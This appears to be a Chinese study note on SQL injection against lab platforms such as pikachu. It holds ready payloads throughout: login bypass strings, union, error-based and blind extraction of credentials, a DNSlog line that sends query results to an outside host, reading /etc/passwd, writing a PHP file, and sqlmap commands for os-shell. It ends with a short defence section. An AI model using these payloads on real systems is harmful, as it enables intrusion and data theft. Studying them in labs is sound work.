

万能密码：对于aspx：' or 1=1--

对于php：'or 1=1#

### 数据库类型判断

1. 根据编程语言

   ASP和.NET:	Microsoft SQL Server，access

   PHP:	MySQL,PostgreSQL

   Java:	Oracle,MySQL

   以上是最常见的搭配

2. 根据数据库报错类型

   ```sql
   and (select count(*) from sysobjects)>0
   and (select count(*) from msyobjects)>0
   ```

   sysobjects 是SQL的内置系统表，在WEB下可读取。

   msyobject是Access的内置系统表，在WEB下不可读取。

   出现如下字眼为Access数据库

   ```
   Microsoft JET Database Engine 错误 '80040e14'
   ```

   如下字眼：MySQL

   ```
   error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
   ```

   SQL Server

   ```
   Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e14'
   [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1:
   ```

   ODBC 是Microsoft特有的

   

### 注入方式

#### 1、union注入

```sql
select id,email from member where username='Kevin' union select username,pw from member where id=1;
```

因而我们构造语句:

```sql
v' union select username,pw from member where id=1;
```

我们以pikachu平台为例，输入上述语句报错，原因是union查询字段数应与主查询字段数相同，我们需要判断主查询字段数

```sql
a' order by 4#
```

order by 4 让查询到的结果按照第四列进行排序，如果没报错，说明存在第四列，以此类推可以判断主查询的字段数。

![](https://s2.loli.net/2022/03/18/2erWhDo8k4gHy9t.png)

通过这个办法我们知道主查询一共有三个字段，因此我可可以进行如下拼接：

```sql
a' union select database(),usr(),version()#
```

![](https://s2.loli.net/2022/03/18/DYv9bRV3Xnsadyk.png)

**查询字段数除了用order by之外，还可以通过不断增加union查询的字段数，知道不产生报错来判断主查询的字段数**

如：

```sql
union select 1
union select 1,2
union select 1,2,3....
```

在使用上述方法时，SQL Server数据库和Oracle数据库可能会出现数据类型不匹配的情况，所以我们需要将1,2,3等数字替换为null

#### 2、information_schema注入

查库：获取数据库名

```sql
select group_concat(schema_name) from information_schema.schemata
```



已知：数据库名(pikachu)

查表：获取字段名(user)

```sql
select table_schema,table_name,3 from infomation_schema.tables where tabel_schema='pikachu'；
```

查字段：

```sql
select table_name,column_name,3 from infomation_schema.columns where table_name='user'；
```

查字段内容：

```sql
select username,password from users;
```

注入代码如下：（以pikachu平台为例）

①利用order by判断主查询字段数：3

②查数据库名：

```sql
a' union select database(),user(),version()#
```

![](https://s2.loli.net/2022/03/18/myzfucpKJ9nIUhq.png)

③查表名：查tables库中名字为piakchu中的表有哪些

```sql
a' union select table_schema,table_name,3 from information_schema.tables where table_schema='pikachu'#
```

![](https://s2.loli.net/2022/03/18/1h4kPyAQNo6CRuj.png)

④查字段名：查columns库中字段名为user库中的内容有哪些

```sql
a' union select table_name,column_name,3 from information_schema.columns where table_name='users'#
```

![](https://s2.loli.net/2022/03/18/NaimuFle4IjhUnJ.png)

⑤查pikaqu库中的user表User和Password字段内容

```sql
a' union select username,password,3 from users#
```

![](https://s2.loli.net/2022/03/18/qCPU3B2hM1lLyKS.png)

#### 3、基于函数报错注入

测试表：

```
mysql> select * from users;
+------+----------+----------+-------+-------+
| id   | username | password | privs | email |
+------+----------+----------+-------+-------+
|    1 | zhangsan | zhangsan |  NULL | NULL  |
|    2 | lisi     | wangwu   |  NULL | NULL  |
|    3 | wangwu   | wangwu   |  NULL | NULL  |
+------+----------+----------+-------+-------+
```

三个常用的函数：

1. updatexml(XML_document,XPath_string,new_value);

2. extravalue();

3. floor();

<br>

##### updataxml(xml_target,xpath_expr,new_xml)  原理：

该函数用于对选中的xml片段进行更新

其中xpath_expr是需要更新的xml路径

如果该参数不符合xpath路径语法会报错，错误信息会显示出错误路径的内容

测试语句：

```
select username,password from users where id=1 and updatexml(1,concat(0x7c,(select @@version)),1);
```

报错：```ERROR 1105 (HY000): XPATH syntax error: '|5.5.53'```

①爆数据库版本信息：

```sql
a' and updatexml(1,concat(0x7e,(SELECT@@version),0x7e),1)--+
```

②爆数据库当前用户：

```sql
a' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#
```

③爆数据库：

```sql
a' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#
```

④爆表：

```sql
a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#
```

⑤爆字段：

```sql
a'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1),0x7e),1)#
```

```sql
1' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #
```

⑥爆字段内容：

```sql
a' and updatexml(1,concat(0x7e,(select password from userslimit 0,1),0x7e),1)#
```

<br>

##### extractvalue(xml_frag,xpath_expr)  原理

对[XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020)文档进行查询的函数

其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样

语法：extractvalue(目标xml文档，xml路径)

其中xml路径就是可以利用的地方，原理与updatexml函数相同，利用xpath语法报错爆出相关信息

测试语句：

```sql
mysql> select username,password from users where id=1 and extractvalue(1,concat(0x7e,(select user())));
```

报错：```ERROR 1105 (HY000): XPATH syntax error: '~root@localhost'```

<br>

floor(),count(),group by利用冲突报错

测试语句：

```sql
mysql> select username,password from users where id=1 union select 1,2 from(select count(*),concat(floor(rand(0)*2),(select user())) x from information_schema.tables group by x) b
```

报错：```ERROR 1062 (23000): Duplicate entry '1root@localhost' for key 'group_key'```

原理：

|  id  | name | age  |      |      |      |
| :--: | :--: | :--: | ---- | ---- | ---- |
|  1   |  11  |  18  |      |      |      |
|  2   |  22  |  19  |      |      |      |
|  3   |  33  |  20  |      |      |      |
|  4   |  44  |  20  |      |      |      |
|  5   |  55  |  20  |      |      |      |

先来说下select count(*) from ...  group by age执行过程：

首先形成如下的一张虚拟表：

| key  | count(*) |
| :--: | :------: |
|      |          |

第一次读取age为18，查看虚拟表中是否存在，若不存在，**则再读取一遍age=18**（这里划上，后面会考）插入其中，count(\*)设置为1，若存在，count(\*)直接+1

以此类推，知道读取完所有age

了解了group by的执行过程后，我们再来分析group by (floor(rand(0)\*2))的具体过程

经过尝试，floor(rand(0)\*2)随机产生的数是有规律的，它的序列是011011011......

第一次读取floor(rand(0)\*2)时，读取到的是0，虚拟表中不存在，再次读取floor(rand(0)\*2，读取到1，插入虚拟表，此时的表为：

| key  | count(\*) |
| :--: | :-------: |
|  1   |     1     |

第三次读floor(rand(0)\*2),读取1，在虚拟表中存在，值加以，此时的表为：

| key  | count(\*) |
| :--: | :-------: |
|  1   |     2     |

第四次读取到0，在虚拟表中不存在，再次读取1，插入到表中，但此时表中已经存在键值1，所以会报错

报错内容会出现重复插入的key值，我们用concat函数将其与我们要查询的信息连接起来即可

<br>

#### 5、delete注入（一班用于前后端发帖、留言、用户等相关删除操作）

```sql
delete from massage where id =56 or updatemxl(1,concat(0x7e,(database())),1)
```

![](https://s2.loli.net/2022/03/18/KCNIJorSQzMiBbD.png)

#### 6、boolian盲注

猜数据库版本

```sql
?id=1' and length(database())>3--+
```

```
?id=1' and ascii(substr(version(),1,1))=65--+
```



猜长度：

```sql
id=1 and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))<100) --+
```

```sql
?id=1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))>1--+
```



猜字符：

```sql
?id=1 and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)="c")--+
```

```sql
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))>0--+
```



```sql
?id=1 and (select length(database()))<100 --+
```

```sql
substr(string,start,length)
```

```sql
select length(database()<7);  #正确返回1，错误返回0
```

注入代码：

```sql
vince' and substr(database(),1,1)='p'#
```

#### 7、时间盲注

时间注入原理：

利用IF(exp,exp1,exp2)函数

如果exp成立执行exp1，否则执行exp2



测试代码：



```sql
vince' and sleep(10)#
```

注入代码：

```sql
vince' and if(substr(database(),1,1)='p',sleep(10),null)#
```



#### 8、宽字节注入

源码：

```php
<?php

$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");
mysql_query("SET NAMES 'gbk'",$conn);

$id = addslashes($_GET['id']);
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql, $conn) or die(mysql_error()); 
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo $row['username']." : ".$row['password'];
  	}
	else 
	{
	print_r(mysql_error()); 
	}      

?>
</font> 
<?php
echo "<br>The Query String is : ".$sql ."<br>";
?>

```

源码第7行：

```php
$id = addslashes($_GET['id']);
```

对参数id进行了转义

受过滤函数 (magic_quotes_gqc 的参数为ON）所有的单引号，双引号都被转义(GBK编码-MYSQL默认)

原理：

php.ini配置文件中如果开启了magic_quotes_gqc，所有输入的```'```前面都会自动添加一个```\```对单引号进行转义

在GBK编码中```\```的编码为%5c,我们可以在输入单引号前添加%df,%df%5c构成繁体字```連```

例如：

```
http://127.0.0.1/sql/kuanzifu.php?id=1%df'
```





服务器文件进行读写操作

条件：

1.知道远程目录

2.该目录需要写权限

3.数据库开启sceure_file_priv=‘ ’show（php.ini）

注入代码：

```sql
1' union select 1,load_file('c:/test.txt') # 
```

```sql
1' union select 1,'123456' into outfile 'c:/test2.txt' # 
```

#### 9.堆叠注入

源码分析：

```php
<?php
try {
    $conn = new PDO("mysql:host=localhost;dbname=test", "root", "root");//连接数据库，初始化一个pdo对象
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);//设置一个属性
    $id = $_GET['id'];
    $sql = "select * from users where id=$id";
    echo "<hr />";
    echo "当前执行语句为：".$sql;
    echo "<hr />";

    $stmt = $conn->query($sql);

    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    foreach($stmt->fetchAll() as $k=>$v) {
        foreach ($v as $key => $value) {
            echo $value;
        }
    }
    $dsn = null;
}
catch(PDOException $e)
{
    echo "error";
}
$conn = null;
?>
```

堆叠注入原理：

程序利用PDO对象连接数据库，这种情况下数据库可以同时执行多条sql查询语句，各个语句之间用分号隔开

例如：

```sql
http://127.0.0.1/sql/duidie.php?id=1;select if(length(database())=4,sleep(5),1)--+
```

堆叠注入的返回的通常是第一条查询语句的结果，因此在利用堆叠注入的时候通常在第二条查询语句中使用时间盲注

这样就可以通过时间来判断第二条语句的结果

#### 10.DNSlog注入

dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据

secure_file_priv特性，有三种状态
secure_file_priv为null 表示不允许导入导出
secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹
secure_file_priv没有设置时，则表示没有任何限制

**有路径或为null 的 则不可以进行 DNSlog 外带**

查询命令：```show variables like '%secure%'```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220430201136.png)



DNSLog注入工具：

[http://www.dnslog.cn](http://www.dnslog.cn/)

[http://ceye.io](http://ceye.io/)

UNC路径就是类似\softer这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。

那我们这就是通过这种方式来带出信息
load_file() 里面我们构造UNC路径

```
?id=12' union select 1,load_file(concat('\\\\',(select database()),'05kb3l.dnslog.cn'))--+&Submit=Submit#
```

DNS记录中就会返回查询的信息

### SQL绕过

#### 1.大小写绕过

通过改变注入payload大小写绕过拦截

#### 2.双写绕过注入

程序将关键词替换为空的时候可以采取双写的方法绕过拦截

#### 3.编码绕过

将payload进行两次URL编码进行绕过

由于服务器会自动对URL进行一次URL解码，所以需要把关键词编码两次

#### 4.内联注释绕过

MySQL服务器将执行```/*! SQL语句*/```里面的SQL语句，但是其他SQL Server将忽略这些扩展。

如果在```！```后面添加版本号，MySQL服务器会在版本大于或等于该版本号的时候才会执行注释内的代码

例如：

```
/*!50110 KEY_BLOCK_SIZE=1024*/   #版本号大于或等于5.1.10才会执行其中代码
```



### MySQL常用函数

#### load_file('/etc/passwd')

条件：

* 用户必须拥有FILE权限
* 输入的路径必须为绝对路径
* 文件容量小于max_allowed_packet字节（默认16MB，最大1G）

例:

```sql
union select 1,load_file('/etc/passwd'),3,4;
```

查询用户权限：

```sql
select * from mysql.user where user='root';
```

```
Select_priv：确定用户是否可以通过SELECT命令选择数据 
Insert_priv：确定用户是否可以通过INSERT命令插入数据 
Update_priv：确定用户是否可以通过UPDATE命令修改现有数据 
Delete_priv：确定用户是否可以通过DELETE命令删除现有数据 
Create_priv：确定用户是否可以创建新的数据库和表 
Drop_priv：确定用户是否可以删除现有数据库和表 
Reload_priv：确定用户是否可以执行刷新和重新加载MySQL所用各种内部缓存的特定命令，包括日志、权限、主机、查询和表 
Shutdown_priv：确定用户是否可以关闭MySQL服务器，将此权限提供给root账户之外的任何用户时，都应当非常谨慎 
Process_priv：确定用户是否可以通过SHOW 
File_priv：确定用户是否可以执行SELECT INTO OUTFILE和LOAD DATA INFILE命令 
Grant_priv：确定用户是否可以将已经授予给该用户自己的权限再授予其他用户，例如，如果用户可以插入、选择和删除foo数据库中的信息，并且授予了GRANT权限，则该用户就可以将其任何或全部权限授予系统中的任何其他用户 
References_priv：目前只是某些未来功能的占位符，现在没有作用 
Index_priv：确定用户是否可以创建和删除表索引 
Alter_priv：确定用户是否可以重命名和修改表结构 
Show_db_priv：确定用户是否可以查看服务器上所有数据库的名字，包括用户拥有足够访问权限的数据库，可以考虑对所有用户禁用这个权限，除非有特别不可抗拒的原因 
Super_priv：确定用户是否可以执行某些强大的管理功能，例如通过KILL命令删除用户进程，使用SET GLOBAL修改全局MySQL变量，执行关于复制和日志的各种命令 
Create_tmp_table_priv：确定用户是否可以创建临时表 
Lock_tables_priv：确定用户是否可以使用LOCK 
Execute_priv：确定用户是否可以执行存储过程，此权限只在MySQL 5.0及更高版本中有意义 
Repl_slave_priv：确定用户是否可以读取用于维护复制数据库环境的二进制日志文件，此用户位于主系统中，有利于主机和客户机之间的通信 
Repl_client_priv：确定用户是否可以确定复制从服务器和主服务器的位置 
Create_view_priv：确定用户是否可以创建视图，此权限只在MySQL 5.0及更高版本中有意义 
Show_view_priv：确定用户是否可以查看视图或了解视图如何执行，此权限只在MySQL 5.0及更高版本中有意义 Create_routine_priv：确定用户是否可以更改或放弃存储过程和函数，此权限是在MySQL 5.0中引入的 Alter_routine_priv：确定用户是否可以修改或删除存储函数及函数，此权限是在MySQL 5.0中引入的 Create_user_priv：确定用户是否可以执行CREATE 
Event_priv：确定用户能否创建、修改和删除事件，这个权限是MySQL 5.1.6新增的 
Trigger_priv：确定用户能否创建和删除触发器，这个权限是MySQL 5.1.6新增的
Create_tablespace_priv: 创建表的空间
```

#### into outfile

条件：

* 用户有FILE权限
* 路径为绝对路径

例：

```sql
select ’<?php phpinfo(); ?>' into outfile 'C:\wwwroot\1.php';
```

#### 其它函数

```SQL
@@datadir	--数据库路径
@@basedir	--MySQL安装路径
@@version_compose_os	--操作系统
user()	--用户名
current_user()	--当前用户名
system_user()	--系统用户名
database()	--数据库名
version()	--MySQL版本
```

### SQL Server常用函数

user_name() 	返回数据库的用户名

db_name()	返回数据库名

is_member('user')	判断user是否为数据库角色



### 查找web路径的方法

1、利用报错

2、load_file(char(47))    “/”的ASCII码是47  列出FreeBSD系统的文件夹目录

3、读取apache的配置未见“httpd.conf”，获取Web路径

4、load_file()读取各种配置文件：

（1）读取服务器配置文件

/user/local/app/apache2/conf/extra/http-vhosts.conf  //虚拟网站设置

/user/local/app/php5/lib/php.ini      // php相关配置

![](https://s2.loli.net/2022/03/18/DWGAjaLoNZUYbpK.png)

### Access数据库注入

#### 判断数据库类型

##### 1、通过内置变量

```sql
and user>0
```

MySQL报错：Microsoft OLE DV Provider for SQL Server 错误’80040e21‘,将navrchar值转换为int。。。。。失败

Access报错：Microsoft OLE DB Provider Drivers ODBC Drivers 错误 ’80040e21

​					ODBC驱动程序不支持所需属性

##### 2、内置数据库类型：

```sql
and (select count(*) from sysobjects)>=0  
and (select count(*) from msysobjects)>=0
```

Access 数据库中不存在sysobjects表，但SQL Server中存在

#### 猜数据库名

```sql
and exists(select * from 表名)
and (select count(*) from 表名)>=0
```

#### 猜长度

```sql
and (select top 1 asc(mid(user_name,1,1)) from administrator)>97
```

#### 联合查询、偏移注入

联合查询：

 ```sql
union select 1,2,3,4,5,6,7 from administrator
 ```

偏移：

```sql
union select 1,a.id,b.id,* from (administrator as a inner join administrator as b on a,id=b.id)
```



![](https://s2.loli.net/2022/03/18/yYX35cTNHR8kdwm.png)

### sqlmap使用

基础用法：

```sqlmap
sqlmap.py -u"URL" --dbs --batch //查看数据库
sqlmap.py -u"URL" -D security --tables --batch  //查看表
sqlmap.py -u"URL" -D security -T user --columns --batch //查看字段
sqlmap.py -u"URL" -D security -T user -C password,username --dump --batch //查看字段内容
```

```
python2 sqlmap.py -r target.txt --privileges --batch	#测试用户权限
```

```
python2 sqlmap.py -r target.txt --os-shell --batch		#返回系统交互shell
```

```
python2 sqlmap.py -r target.txt --sql-shell --batch		#返回sql交互shell
```

```
--data "POST参数"
```

```
python2 sqlmap.py -r target.txt -dbs -v 4 --batch		#显示详细信息
-v 0	#只显示python的回溯、错误和关键信息
-v 1	#显示信息和警告消息
-v 4	#显示http请求
-v 5	#显示http响应头
-v 6	#显示http响应页面内容
```

执行指定的sql语句：

```shell
python2 sqlmap.py -u "http://10.10.10.141/pentest/test/sqli/sqltamp.php?gid=1" --batch -D mysql --sql-query="select count(*) from user;"
```

导出数据库：

--dump-format=CSV（导出格式，默认为CSV）

--csv-del="--"（相邻两列间隔方式，默认为空格）

--output-dir="E:\out"（导出路径，此处应填写文件夹路径）

例如：

```shell
python2 sqlmap.py -u "http://10.10.10.141/pentest/test/sqli/sqltamp.php?gid=1" --batch -D mysql -T user --dump --dump-format=CSV --csv-del="--" --output-dir="E:\out"
```



<br>

### SQL注入的防范

SQL注入防范主要分两种：数据类型判断和特殊字符转义

1. 数据类型防范

   数据类型防范只能防御数字型注入，如使用is_number()、ctype()_digit等判断数据类型

2. 特殊字符转义

   攻击者在字符型注入过程中必然会出现单引号等特殊字符，将这些字符转义即可防范SQL注入

   例如使用OWASP ESAPI将特殊字符进行转义

   这里以Oracle举例：

   ```
   Oracle orcl = new OracleCOdec();
   String sql = "select userid,username,password from user where useri="+ESAPI.encoder().encoderForSQL(orcl,userID);				#利用ESAPI中对数据库字符转码的接口对特殊字符进行处理
   Statement stmt = conn.createStatement(sql);
   ```

   但是特殊字符转义比较难防范二次注入

   什么是二次注入：

   例如：PHP开启magic_quotes_gpc后，将会对特殊字符转义，如将'过滤为\\'

   在插入数据时：

   ```
   $sql = "insert into message(id,title,content) values(3,'hummer\'','content_test')"
   ```

   在数据库执行语句时，攻击者并没有达到攻击效果，但是hummer'被写入了数据库中的title字段中，如果

   在网站的另一处存在某个查询语句，攻击者可以先将payload写入数据库再查询的方式在mysql上执行

   自己构造的payload，以此来达到SQL注入的目的

   

3. 使用预编译语句

   在java中，提供了三个结构与数据库交互，分别是Statement，PreparedStatement,CallableStatement

   他们后者分别是前者的子类

   例如：

   ```java
   int id = Integer.parseInt(request.getParameter("id");
   String sql = "select id,username,password from users where id = ?";
   PreparedStatement ps = this.conn.prepareStatement(sql);		//使用预编译接口
   ps.setInt(1,id);
   ResultSet res = ps.executeQuery();                         
   ```

   

4. 网站的报错信息不要返回给客户端，例如一些字符错误，数据库的报错信息等等。
5. 对用户的操作权限进行安全限制，例如普通用户只给普通权限。



